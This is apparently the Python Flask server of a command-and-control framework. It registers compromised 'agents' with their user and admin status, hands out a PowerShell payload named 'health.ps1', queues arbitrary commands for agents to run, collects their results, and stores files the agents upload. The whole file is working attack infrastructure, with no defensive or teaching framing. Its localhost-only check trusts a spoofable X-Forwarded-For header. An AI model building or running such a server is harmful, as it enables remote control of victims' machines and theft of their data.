import os
from base64 import b64decode, b64encode
from flask import Flask, request, jsonify, render_template, send_from_directory
from functools import wraps
import uuid
import sqlite3
import datetime


app=Flask(__name__)

def get_client_ip():
	if request.headers.get('X-Forwarded-For'):
		return request.headers['X-Forwarded-For'].split(',')[0]  # First IP in the list
	return request.remote_addr  # Default to remote_addr

# Custom decorator to restrict access to localhost
def restrict_to_localhost(f):
	@wraps(f)
	def decorated_function(*args, **kwargs):
		client_ip = get_client_ip()
		if client_ip not in ['127.0.0.1', '::1']:
			return jsonify({"error": f"Access forbidden"}), 403
		return f(*args, **kwargs)
	return decorated_function

def get_db():
	conn = sqlite3.connect("main.db", check_same_thread=False)
	conn.row_factory = sqlite3.Row
	return conn

class Listener:
	def __init__(self):
		self.agents=[]
	def addAgent(self,registerAgent):
		self.agents.append(registerAgent)
	def listAgents(self):
		to_ret=""
		for i in range(len(self.agents)):
			to_ret+=self.agents[i].name+"\t"+str(self.agents[i].ip)
		return to_ret
			
class registerAgent:
	def __init__(self, ip, name):
		self.ip=ip
		# self.port=port
		self.name=name
		self.path=f"listener/{self.name}/"
		self.filepath=f"listener/{self.name}/files"

		# print(self.path)
		# print(self.filepath)
		if os.path.exists(self.path) == False:
			os.mkdir(self.path)
		if os.path.exists(self.filepath) == False:
			os.mkdir(self.filepath)

listener=Listener()


@app.route('/')
@restrict_to_localhost
def main():
	return render_template("index.html")
@app.route('/entrypoint')
def entrypoint():
	return send_from_directory(os.getcwd(),"health.ps1")
@app.route('/tasks', methods=['GET'])
def get_tasks():
	conn = get_db()
	cursor = conn.cursor()
	
	# Fetch pending tasks
	cursor.execute("SELECT id, agent_id, command FROM tasks WHERE status = 'pending'")
	pending_tasks = [{"task_id": task["id"], "agent_id": task["agent_id"], "command": task["command"]} for task in cursor.fetchall()]
	
	# Fetch completed tasks
	cursor.execute("SELECT id, agent_id, command, result FROM tasks WHERE status = 'completed'")
	completed_tasks = []
	for task in cursor.fetchall():
		try:
			decoded_result = b64decode(task["result"]).decode(errors="ignore") if task["result"] else "No result"
		except Exception as e:
			decoded_result = f"Decoding error: {str(e)}"
		
		completed_tasks.append({
			"task_id": task["id"],
			"agent_id": task["agent_id"],
			"command": task["command"],
			"result": decoded_result
		})
	return jsonify({"pending": pending_tasks, "completed": completed_tasks})
@app.route('/agents')
@restrict_to_localhost
def agents():
	conn = get_db()
	cursor = conn.cursor()
	cursor.execute("SELECT agent_id, ip_address, user, is_admin FROM agents")
	agents = cursor.fetchall()
	all_results=[]
	for agent in agents:
		if agent["is_admin"]==1:
			# return jsonify([{"agent_id": agent["agent_id"], "ip": agent["ip_address"], "user": 'Admin: '+agent["user"]} for agent in agents])
			all_results.append({
				"agent_id": agent["agent_id"], "ip": agent["ip_address"], "user": 'Admin: '+agent["user"]
				})
			
		else:
			all_results.append({"agent_id": agent["agent_id"], "ip": agent["ip_address"], "user": agent["user"]})
			# return jsonify([{"agent_id": agent["agent_id"], "ip": agent["ip_address"], "user": agent["user"]} for agent in agents])
	return all_results

@app.route('/register', methods=["POST"])
def register():
	data=request.get_json()
	name=data.get('name')
	ip=data.get('ip')
	user=data.get('user')
	is_admin=data.get("is_admin")
	if str(is_admin)=="True":
		is_admin=1
	else:
		is_admin=0
	# port=data.get('port')
	print({"message": "Received", "name": name, "ip": ip, "user": user, "is admin":is_admin})
	json=jsonify({"message": "Received", "name": name, "ip": ip, "user": user})
	agent=registerAgent(ip, name)
	listener.addAgent(agent)
	listener.listAgents()
	conn=get_db()
	cursor=conn.cursor()
	cursor.execute("INSERT OR IGNORE INTO agents (agent_id, ip_address, user, is_admin) VALUES (?,?,?,?)", (name,ip,user,is_admin))
	conn.commit()
	return "Complete"
@app.route('/download', methods=['POST'])
def download():
	data=request.get_json()
	file=data.get('data') # Assuming b64 encoded
	name=data.get('name') # Get name of agent so we can properly place file in their dir
	print(file[0:2])
	print(type(file))
	print(name)
	if (file[0:2] == "//"):

		filename=uuid.uuid4().hex
		with open(os.path.join(f"listener/{name}/files/"+filename), "w") as fp:
			fp.write(b64decode(file).decode('utf-16')) # If its a string which for some reason (atleast in notepad) starts with //, utf 16 decode it
			fp.close()
	else:
		filename=uuid.uuid4().hex
		with open(os.path.join(f"listener/{name}/files/"+filename), "w") as fp: #Otherwise its a file, decode like normal
			fp.write(str(b64decode(file).decode()))
			fp.close()
	return "Complete"
@app.route('/report', methods=["POST"])
def report():
	data=request.get_json()
	tid=data.get("task_id")
	results=data.get("results")
	conn=get_db()
	cursor=conn.cursor()
	cursor.execute("UPDATE tasks SET result = ?, status = 'completed' WHERE id = ?", (results, tid))
	conn.commit()
	# print(results)
	# print(str(b64decode(results)))
	return "Completed"
@app.route('/add_task', methods=['POST'])
@restrict_to_localhost
def add_task():
	data=request.get_json()
	agent_name=data.get('agent_id')
	cmd=data.get('command')
	conn = get_db()
	cursor = conn.cursor()
	cursor.execute("INSERT INTO tasks (agent_id, command) VALUES (?, ?)", (agent_name, cmd))
	conn.commit()
	return "Complete"

@app.route("/task/<name>", methods=["GET"])
def task(name):
	conn=get_db()
	cursor=conn.cursor()
	cursor.execute("SELECT id, command FROM tasks WHERE agent_id = ? AND status = 'pending' LIMIT 1", (name,))
	task = cursor.fetchone()
	if task:
		print(task["command"])
		return str(task["command"]) + "END" + str(task["id"])
	else:
		return "No Command"



if __name__ == '__main__':
	app.run(debug=True)
